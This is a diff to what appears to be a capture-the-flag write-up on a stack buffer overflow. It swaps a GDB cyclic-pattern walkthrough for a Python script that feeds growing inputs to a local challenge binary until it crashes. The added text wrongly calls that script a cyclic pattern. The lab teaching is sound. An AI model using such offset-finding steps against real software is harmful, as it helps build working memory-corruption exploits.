@@ -75,43 +75,35 @@ So what we do now?
 If we can identify the offset (the distance between the start of the buffer and the point where the program decides where to return after a function) we can write “useless” data up to that point and then you decide where the program should jump.
 We have to identify the exact number of bytes to write before reaching the return address.
 
-To do so will use a cyclic pattern, which is a special string that does not repeat itself and allows us to understand where we are in the stack.
+To do so we will use a script that with a cyclic pattern, passing recursively a more amount of data trying to find the exact amout where the program crash.
 
-We can check the RIP register that contains the address of the next instruction to be executed.
-In a stack buffer overflow, the return address is overwritten and loaded into RIP.
-By analyzing the value of RIP after the crash, it is possible to determine when control of the execution flow is obtained.
+``` python
+import subprocess
 
-Execute the program with GDB
+binary = "./chall"
 
-`gdb ./chall`
+for i in range(1, 200):
+    payload = b"A" * i
 
-than we run it passing the pattern
+    try:
+        p = subprocess.Popen(
+            [binary],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
 
-```GDB
-run < <(python3 -c "from pwn import *; print(cyclic(200))")
-```
+        out, err = p.communicate(payload, timeout=1)
 
-the program will crash
+        if p.returncode is not None and p.returncode < 0:
+            print(f"[+] Segmentation fault a {i} byte")
+            break
+        else:
+            print(f"[-] {i} byte: OK")
 
-```GDB
-(gdb) run < <(python3 -c "from pwn import *; print(cyclic(200))")
-Starting program: /home/simux/OverflowTheGate/chall < <(python3 -c "from pwn import *; print(cyclic(200))")
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-=== Overflow the Gate ===
-Welcome!
-puts @ 0x7ffff7e0de50
-Send your payload:
-[*] Checking for new versions of pwntools
-    To disable this functionality, set the contents of /home/simux/.cache/.pwntools-cache-3.10/update to 'never' (old way).
-    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
-        [update]
-        interval=never
-[*] You have the latest version of Pwntools (4.15.0)
-Bye!
-
-Program received signal SIGSEGV, Segmentation fault.
-0x000000000040125f in vuln ()
+    except Exception as e:
+        print(f"[!] Errore a {i} byte: {e}")
+        break
 ```
 
 
